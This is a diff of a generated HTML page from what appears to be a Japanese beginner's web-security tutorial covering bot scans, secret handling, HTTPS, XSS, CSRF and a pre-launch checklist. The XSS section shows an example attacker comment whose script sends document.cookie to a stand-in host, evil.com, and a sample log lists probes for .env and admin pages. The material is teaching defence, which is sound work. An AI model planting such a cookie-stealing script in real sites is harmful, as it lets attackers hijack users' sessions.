@@ -7762,12 +7762,14 @@
 <hr />
 <h2 id="_5">攻撃は自動でやってくる<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
 <p>インターネット上のサーバーは、公開した瞬間からスキャンされます。</p>
+<div class="admonition info">
 <div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>2024-01-15 03:22:11 GET /wp-admin/             → WordPress の管理画面を探している
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>2024-01-15 03:22:12 GET /phpmyadmin/           → phpMyAdmin を探している
 </span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>2024-01-15 03:22:13 GET /.env                  → 環境変数ファイルを盗もうとしている
 </span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>2024-01-15 03:22:14 GET /admin/                → 管理画面を探している
 </span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>2024-01-15 03:22:15 POST /api/login            → パスワードを総当たり（ブルートフォース）
 </span></code></pre></div>
+</div>
 <p>これは実際のサーバーログによく見られるパターンです。攻撃者ではなくボットが、世界中のサーバーに対して自動で試しています。「うちのサイトには価値がない」は関係ありません。</p>
 <p><strong>狙われるもの：</strong>
 - <code>.env</code> ファイル（API キー・DB パスワードが丸ごと手に入る）
@@ -7825,11 +7827,13 @@
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">api_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;OPENAI_API_KEY&quot;</span><span class="p">)</span>  <span class="c1"># 値はコードに書かない</span>
 </span></code></pre></div>
 <h3 id="_9">やってしまったときの対処<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<div class="admonition info">
 <div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>.env を push してしまった場合:
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>  1. 即座にそのAPIキー・パスワードを無効化・再発行する
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>  2. git の履歴から削除する（削除してもキャッシュされている可能性あり）
 </span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>  → 「削除したから大丈夫」は間違い。必ずキーを再発行すること。
 </span></code></pre></div>
+</div>
 <h3 id="cicd">CI/CD での秘密情報の渡し方<a class="headerlink" href="#cicd" title="Permanent link">&para;</a></h3>
 <p>GitHub Actions や Cloudflare Pages にキーを渡すには、サービスの「Secrets」機能を使います。</p>
 <div class="language-yaml highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># GitHub Actions での例</span>
@@ -7843,6 +7847,7 @@
 <hr />
 <h2 id="https">HTTPS（通信の暗号化）<a class="headerlink" href="#https" title="Permanent link">&para;</a></h2>
 <h3 id="http-vs-https">HTTP vs HTTPS<a class="headerlink" href="#http-vs-https" title="Permanent link">&para;</a></h3>
+<div class="admonition info">
 <div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>HTTP（暗号化なし）:
 </span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>  あなた ──── &quot;パスワード: abc123&quot; ────→ サーバー
 </span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>                       ↑
@@ -7852,6 +7857,7 @@
 </span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>  あなた ──── &quot;x7$Kp#mQ...&quot; ────→ サーバー
 </span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>  （TLS で暗号化されているので盗み見ても意味がない）
 </span></code></pre></div>
+</div>
 <p><strong>Cloudflare Pages・GitHub Pages に deploy すれば HTTPS は自動で有効</strong>になります。ブラウザのアドレスバーに 🔒 が表示されていれば OK です。</p>
 <blockquote>
 <p>HTTPS の仕組み（TLS・公開鍵暗号・ハイブリッド暗号）は <a href="../暗号技術/">暗号技術</a> で詳しく解説しています。</p>
@@ -7860,6 +7866,7 @@
 <h2 id="xss">XSS（クロスサイトスクリプティング）<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h2>
 <h3 id="_10">何をされる攻撃か<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
 <p><strong>攻撃者がサイトに悪意ある JavaScript を埋め込み、他のユーザーのブラウザで実行させます。</strong></p>
+<div class="admonition info">
 <div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>シナリオ: コメント欄のある掲示板
 </span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
 </span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>1. 攻撃者がコメントに「&lt;script&gt;悪いコード&lt;/script&gt;」を投稿
@@ -7869,6 +7876,7 @@
 </span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>4. ユーザーのクッキー（ログイン情報）が攻撃者のサーバーに送られる
 </span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>5. 攻撃者がそのクッキーを使ってそのユーザーとしてログインできる
 </span></code></pre></div>
+</div>
 <div class="language-html highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="cm">&lt;!-- 攻撃者が投稿するコメント --&gt;</span>
 </span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
 </span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;https://evil.com/steal?c=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
@@ -7891,6 +7899,7 @@
 <h2 id="csrf">CSRF（クロスサイトリクエストフォージェリ）<a class="headerlink" href="#csrf" title="Permanent link">&para;</a></h2>
 <h3 id="_12">何をされる攻撃か<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
 <p><strong>別のサイトから、ユーザーが意図しないリクエストを「ユーザー本人として」送らせます。</strong></p>
+<div class="admonition info">
 <div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>シナリオ: ネットバンキング
 </span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
 </span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>1. あなたが銀行サイトにログイン中（ブラウザにクッキーが保存されている）
@@ -7906,6 +7915,7 @@
 </span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>4. ブラウザは「銀行サイトへのリクエスト」に自動でクッキーを付ける
 </span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>5. 銀行サーバーから見ると「あなた本人からの振込リクエスト」に見える
 </span></code></pre></div>
+</div>
 <p>XSS は「クッキーを盗む」攻撃、CSRF は「クッキーを使ってリクエストを送らせる」攻撃です。どちらもクッキーが関係しますが、悪用の仕方が違います。</p>
 <h3 id="_13">防御策<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
 <div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># FastAPI + CSRF トークンの例</span>
@@ -7970,15 +7980,18 @@
 <p>GitHub・Google・GitHub 等の重要サービスでは必ず有効にしてください。</p>
 <h3 id="_17">最小権限の原則<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
 <p>必要な権限だけを付与します。「とりあえず全部」は事故の温床です。</p>
+<div class="admonition info">
 <div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>GitHub リポジトリのロール:
 </span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>  Owner  → リポジトリの削除もできる（本当に必要な人だけ）
 </span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>  Admin  → 設定変更・メンバー管理
 </span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>  Write  → コードのプッシュ・マージ
 </span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>  Read   → 閲覧のみ（外部レビュアーはここで十分）
 </span></code></pre></div>
+</div>
 <hr />
 <h2 id="_18">セキュリティチェックリスト<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h2>
 <p>公開前に必ず確認してください。</p>
+<div class="admonition info">
 <div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>【秘密情報】
 </span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>□ .env が .gitignore に追加されている
 </span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>□ API キー・パスワードがコードに直接書かれていない
@@ -7997,6 +8010,7 @@
 </span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>□ npm audit / pip-audit を実行した
 </span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>□ critical・high の脆弱性がない
 </span></code></pre></div>
+</div>
 <hr />
 <h2 id="_19">確認問題<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h2>
 <ol>
